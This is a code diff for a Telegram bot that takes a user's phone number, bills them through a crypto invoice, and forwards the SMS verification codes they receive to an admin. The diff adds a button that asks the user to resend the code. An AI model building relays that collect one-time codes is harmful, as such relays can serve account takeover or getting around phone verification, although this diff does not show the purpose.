@@ -33,7 +33,6 @@ logging.basicConfig(
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# CryptoPay клиент
 crypto = AioCryptoPay(
     token=CRYPTO_TOKEN.strip(),
     network=Networks.MAIN_NET   # или Networks.TEST_NET при тестировании
@@ -129,7 +128,6 @@ async def process_phone(message: Message, state: FSMContext):
             description=f"Регистрация номера {phone} ({data['operator']})"
         )
 
-        # Проверка наличия ссылки (на всякий случай)
         if not hasattr(invoice, 'bot_invoice_url') or not invoice.bot_invoice_url:
             raise AttributeError("Нет bot_invoice_url в объекте Invoice")
 
@@ -195,12 +193,23 @@ async def catch_sms(message: Message):
         return
 
     await message.answer("⏳ Код принят. Ожидай завершения...")
+
+    # Клавиатура с двумя кнопками в одной строке
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🏁 Завершить регистрацию", callback_data=f"done_{req['id']}")]
+        [
+            InlineKeyboardButton(text="🏁 Завершить регистрацию", callback_data=f"done_{req['id']}"),
+            InlineKeyboardButton(text="🔄 Повторить код", callback_data=f"repeat_{req['id']}")
+        ]
     ])
+
     await bot.send_message(
         ADMIN_ID,
-        f"🔑 КОД ПРИШЁЛ\nЗаявка: {req['id']}\nПользователь: {req['username']}\nНомер: {req['phone']}\nОператор: {req['operator']}\nКод: `{code}`",
+        f"🔑 КОД ПРИШЁЛ\n"
+        f"Заявка: {req['id']}\n"
+        f"Пользователь: {req['username']}\n"
+        f"Номер: {req['phone']}\n"
+        f"Оператор: {req['operator']}\n"
+        f"Код: `{code}`",
         reply_markup=kb,
         parse_mode="Markdown"
     )
@@ -220,6 +229,39 @@ async def finish_job(callback: CallbackQuery):
     except Exception as e:
         logging.exception("Ошибка завершения заявки")
         await callback.answer("Ошибка", show_alert=True)
+
+@router.callback_query(F.data.startswith("repeat_"))
+async def repeat_code(callback: CallbackQuery):
+    try:
+        rid = int(callback.data.split("_")[1])
+
+        for req in pending_requests:
+            if req["id"] == rid:
+                if req["status"] != "waiting_sms":
+                    await callback.answer("Заявка уже не в статусе ожидания кода", show_alert=True)
+                    return
+
+                await bot.send_message(
+                    req["user_id"],
+                    "❌ Код не подошёл или возникла ошибка.\n\n"
+                    "Пожалуйста, пришли код из СМС ещё раз:"
+                )
+
+                updated_text = callback.message.text + "\n\n🔄 Запрошено повторение кода у пользователя"
+                await callback.message.edit_text(
+                    updated_text,
+                    reply_markup=callback.message.reply_markup,
+                    parse_mode="Markdown"
+                )
+
+                await callback.answer("Пользователю отправлен запрос на повтор кода")
+                return
+
+        await callback.answer("Заявка не найдена", show_alert=True)
+
+    except Exception as e:
+        logging.exception("Ошибка при запросе повтора кода")
+        await callback.answer(f"Ошибка: {str(e)[:60]}", show_alert=True)
 
 async def main():
     logging.info("Бот запущен")
